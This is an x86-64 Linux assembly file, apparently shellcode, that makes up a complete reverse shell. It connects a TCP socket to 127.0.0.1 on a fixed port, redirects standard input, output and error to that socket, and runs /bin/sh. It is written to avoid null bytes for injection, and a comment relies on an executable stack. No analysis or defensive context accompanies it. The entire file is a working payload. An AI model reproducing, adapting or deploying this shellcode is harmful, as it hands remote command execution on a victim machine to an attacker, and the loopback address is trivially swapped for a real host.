.global _start

.text
_start:
	jmp next
sh:
    .ascii "/bin/sh"
eol:
    .byte 0xff
sockaddr:
	.byte 2
	.byte 0
	.word 4391
	.byte 127
	.byte 0
	.byte 0
	.byte 1
next:
	# socket(AF_INET, SOCK_STREAM, 0)
    # sys_socket
    xorl %eax, %eax
    movb $41, %al
    # AF_INET
    xorl %edi, %edi
    movb $2, %dil

    # SOCK_STREAM
    xorl %esi, %esi
    movb $1, %sil

    # no arguments
    xorl %edx, %edx
    syscall

	# connect(fd, &sockaddr, 16)
	# it could be assumed that the fd is less than 2 bytes long
	# move the socket to first argument
	movl %eax, %edi
	# sys_connect
	xorl %eax, %eax
	movb $42, %al

	leaq sockaddr(%rip), %rsi
	# sizof(struct sockaddr)
	xorl %edx, %edx
	movb $16, %dl

	syscall
	# at this point rax can be -111 (connection refused)

	# dupd2(fd, 0)
	xorl %esi, %esi
	xorb %sil, %sil
    # movb $0, %sil

	# sys_dup2
	xorl %eax, %eax
	movb $33, %al
	syscall

	movb $1, %sil
	xorl %eax, %eax
	movb $33, %al
	syscall

	movb $2, %sil
	xorl %eax, %eax
	movb $33, %al
	syscall

    xorl %eax, %eax
    # stack is executable, i can do this
    movb %al, eol(%rip)
    leaq sh(%rip), %rdi
    # sys_execve
    movb $59, %al
    xorl %edx, %edx
    xorl %esi, %esi
    syscall

    xorl %eax, %eax
    movb $60, %al
    xorl %edi, %edi
    syscall
